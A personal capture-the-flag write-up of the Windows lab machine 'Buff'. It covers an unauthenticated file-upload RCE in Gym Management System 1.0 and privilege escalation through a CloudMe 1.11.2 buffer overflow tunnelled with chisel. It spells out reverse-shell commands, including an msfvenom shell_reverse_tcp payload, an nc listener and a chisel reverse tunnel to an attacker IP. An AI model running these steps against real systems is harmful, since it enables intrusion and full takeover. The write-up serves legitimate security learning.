# Buff — Easy — Windows

**Date:** 29 July 2026

---

## Tags
`#windows` `#web` `#gym-management` `#unauth-rce` `#file-upload` `#cloudme` `#buffer-overflow` `#chisel` `#port-forwarding` `#privesc`

---

## What I Know

| Item       | Detail                                                          |
| ---------- | -------------------------------------------------------------- |
| Target     | 10.129.40.198                                                  |
| OS         | Windows                                                        |
| Open ports | 7680 (DoSvc), 8080 (HTTP)                                       |
| Service    | Apache 2.4.43 (PHP 7.4.6) — Gym Management System 1.0           |
| Foothold   | Gym Management System 1.0 unauthenticated file-upload RCE       |
| User       | shaun                                                          |
| Privesc    | CloudMe 1.11.2 buffer overflow on 127.0.0.1:8888 (via chisel) → Administrator |

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.40.198

Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-29 11:54 +0100
Nmap scan report for 10.129.40.198
Host is up (0.037s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE
7680/tcp open  pando-pub
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 44.60 seconds
```

<img width="852" height="312" alt="image" src="https://github.com/user-attachments/assets/6f739d38-b795-48ce-ab2d-9045eda1cb75" />

```
nmap -sC -sV -p7680,8080 10.129.40.198

Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-29 11:55 +0100
Nmap scan report for 10.129.40.198
Host is up (0.097s latency).

PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.47 seconds
```
<img width="1207" height="399" alt="image" src="https://github.com/user-attachments/assets/86fe2bb9-16d4-4637-bbfb-5463474b4ee1" />

**What each port tells me:**
- **Port 7680 (DoSvc)** — Windows Delivery Optimization, the P2P service for distributing Windows Update / Store payloads. Not a useful attack surface here.
- **Port 8080 (HTTP)** — Apache 2.4.43 with PHP 7.4.6. With nothing else exposed, this web app is the entry point.

---

## Enumeration Log

```
OBSERVATION: Port 7680 is open
WHAT IT TELLS ME: It's an uncommon port, so I need to identify it before dismissing it
WHAT I AM GOING TO TRY: Research port 7680
WHY: Unknown ports can hide services worth attacking
RESULT:
- 7680 is the default for Windows Delivery Optimization (DoSvc), a Windows 10 peer-to-peer service
  for sharing Microsoft Update and Store payloads between hosts. Not useful as an attack surface
WHAT NEXT: Investigate the web app on 8080
```

```
OBSERVATION:
- The web app is a gym-facility site with a login form (notably, the password isn't sent in the
  POST request)
- The /contact.php page discloses "Made using Gym Management Software 1.0"
WHAT IT TELLS ME: Research the disclosed product + version for a known vulnerability
WHAT I AM GOING TO TRY: Look up exploits for Gym Management System 1.0
WHY: A known product + version often has a public exploit
RESULT:
- Gym Management System 1.0 has a public unauthenticated RCE (file-upload bypass via /upload.php)
- The searchsploit version (48506.py) was fragile, so I used the more reliable exploit from
  https://github.com/helloandrewpaul/Gym-Management-System-Unauthenticated-RCE-Vulnerability,
  plus a "PHP Ivan Sincek" payload from revshells.com (the basic PHP reverse shell didn't work)
- Got a foothold and read user.txt (user: shaun)
WHAT NEXT: Enumerate for a privesc path
```

<img width="2369" height="1086" alt="image" src="https://github.com/user-attachments/assets/d8862ba2-3566-4932-8313-8f76929a6fbd" />

<img width="1988" height="757" alt="image" src="https://github.com/user-attachments/assets/b4befe40-aee6-4a43-bb39-e3bf962fc077" />

<img width="2503" height="351" alt="image" src="https://github.com/user-attachments/assets/d5030ccb-4c71-40f6-8c2a-dc5837de4402" />

<img width="1255" height="878" alt="image" src="https://github.com/user-attachments/assets/ec3e302b-4f15-488c-8342-5f8c78f4e077" />

<img width="1596" height="921" alt="image" src="https://github.com/user-attachments/assets/dec3a648-4a88-4493-a499-f076d8f7bacc" />

<img width="1230" height="322" alt="image" src="https://github.com/user-attachments/assets/bfb4a937-6fa9-4eca-924a-e32c325c283a" />

<img width="1230" height="693" alt="image" src="https://github.com/user-attachments/assets/f8caeedf-6cdb-470b-803a-8af5c17a7263" />


```
OBSERVATION:
- Enumeration found a third-party app, CloudMe 1.11.2, installed on the server (the Cloudme_1112.exe
  binary is also in shaun's Downloads)
- CloudMe 1.11.2 has a known buffer-overflow vulnerability, and the service listens on port 8888
  confirmed with netstat -ano (bound to 127.0.0.1, so only reachable from the box itself)
- The server has no Python, and there's no SSH/creds, so I'll need chisel to tunnel port 8888 back to
  my attack machine and run the exploit from there
WHAT IT TELLS ME: I can exploit the CloudMe BOF to escalate, but only after port-forwarding 8888 out
WHAT I AM GOING TO TRY:
- Analyse the exploit (searchsploit windows/remote/48389.py)
- Set up chisel to forward 127.0.0.1:8888 to my machine, then run the BOF against the tunnel
WHY:
- To understand the exploit and adjust the payload
- Because 8888 is localhost-only and the target can't run the Python exploit itself
RESULT:
- The PoC's shellcode just launched calc.exe; I replaced it with a msfvenom reverse-shell payload
  (matching the bad chars) using the exploit's commented guidance
- The exploit targets 127.0.0.1:8888, so my chisel tunnel had to expose that same address locally
- Set up chisel (server on my box, client on target), ran the exploit through the tunnel, and caught a
  shell as Administrator (CloudMe runs with high privilege)
- Read root.txt
```

<img width="2081" height="314" alt="image" src="https://github.com/user-attachments/assets/0a7a49f8-fd0d-4238-a47b-bc95649f57ba" />

<img width="2523" height="457" alt="image" src="https://github.com/user-attachments/assets/a39cb42e-2bd0-4a7c-b79a-c02c5ec73d88" />

<img width="1080" height="1019" alt="image" src="https://github.com/user-attachments/assets/17c0a9d5-1c2e-44ee-88d9-c9b55438d54c" />

<img width="1500" height="939" alt="image" src="https://github.com/user-attachments/assets/476702d1-c374-4bec-aa73-20e12765e298" />

<img width="1527" height="1088" alt="image" src="https://github.com/user-attachments/assets/3c9260cc-9d12-4a81-8348-6f71c15fd12b" />

<img width="1535" height="1050" alt="image" src="https://github.com/user-attachments/assets/808b6306-221c-486a-ab2a-4bb9f76c03d8" />

<img width="1218" height="195" alt="image" src="https://github.com/user-attachments/assets/5381b357-f3b0-4bfd-91e9-a1b3ece61ecc" />

<img width="1840" height="330" alt="image" src="https://github.com/user-attachments/assets/f9cc3ff5-ed2a-4720-b34d-77948fda16b1" />

<img width="1376" height="211" alt="image" src="https://github.com/user-attachments/assets/a622d2aa-3a7c-45b8-82f4-db9e450ee48b" />

<img width="1258" height="138" alt="image" src="https://github.com/user-attachments/assets/febc56e9-6499-4e7b-8fe8-021c6718eece" />

<img width="1230" height="94" alt="image" src="https://github.com/user-attachments/assets/ae965f73-c987-456b-bad6-edf673c7535b" />

<img width="1292" height="887" alt="image" src="https://github.com/user-attachments/assets/a8ec19e9-af15-4e36-8c29-a075f4cd8687" />


---

## Foothold

**How I got in:** The site on port 8080 disclosed "Gym Management Software 1.0" on its contact page. That version has an **unauthenticated file-upload RCE**: `/upload.php` doesn't check for a valid session, and its extension filter can be bypassed to upload a PHP web shell, which is then executed. The searchsploit PoC was unreliable, so I used a maintained exploit plus a robust PHP reverse-shell payload, landing a shell as **shaun**.

**Command / exploit used:**
```
# unauth RCE against Gym Management System 1.0
git clone https://github.com/helloandrewpaul/Gym-Management-System-Unauthenticated-RCE-Vulnerability
python3 exploit.py http://10.129.40.198:8080/
# (basic PHP revshell failed → used a "PHP Ivan Sincek" payload from revshells.com)
nc -lnvp <LPORT>          # → shell as shaun
```

**Why it worked:** Gym Management System 1.0's upload endpoint trusted the client and applied a weak extension check, so a crafted request slipped a PHP file into a web-served directory. No authentication was required and reaching the page was enough to get code execution.

---

## Privilege Escalation

**Path taken (shaun → Administrator):** Local enumeration found **CloudMe 1.11.2** installed (binary in shaun's Downloads) with its service listening on **127.0.0.1:8888** (confirmed via `netstat -ano`). CloudMe 1.11.2 has a public **buffer-overflow** exploit, but the service is bound to localhost, and the box has no Python to run the exploit locally. I uploaded **chisel** and tunnelled the target's `127.0.0.1:8888` back to my attack machine, edited the PoC's shellcode from "launch calc.exe" to a msfvenom reverse shell (matching bad characters), and fired it through the tunnel. CloudMe runs with high privilege, so the shell came back as **Administrator**. Read root.txt.

```
# on target: run chisel client
./chisel.exe client <ATTACKER_IP>:8080 R:8888:127.0.0.1:8888
# on attacker: chisel server
./chisel server -p 8080 --reverse
# generate the reverse-shell shellcode for the PoC (48389.py), matching bad chars:
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b '\x00\x0a\x0d' -f python -v payload
# point the exploit at 127.0.0.1:8888 (now tunnelled) and run it
python2 48389.py            # → Administrator shell on the listener
```

**Why it worked:** CloudMe 1.11.2 is unpatched against a stack buffer overflow, sending an oversized payload to its 8888 listener overwrites the saved return address, letting me redirect execution into my shellcode. The service being localhost-only wasn't real protection: with a foothold I could tunnel to it with chisel, and because CloudMe ran as Administrator (SYSTEM-level context), exploiting it handed over the box. The lack of Python on the target just meant the exploit had to run on my side of the tunnel.

---

## Post-Box Debrief

1. **Foothold technique in one sentence:** Identified Gym Management System 1.0 from the contact page and used its unauthenticated `/upload.php` file-upload RCE to drop a PHP reverse shell as shaun.
2. **Privesc technique in one sentence:** Tunnelled the localhost-only CloudMe 1.11.2 service (port 8888) out with chisel and exploited its buffer overflow (payload swapped from calc.exe to a reverse shell) to get an Administrator shell.
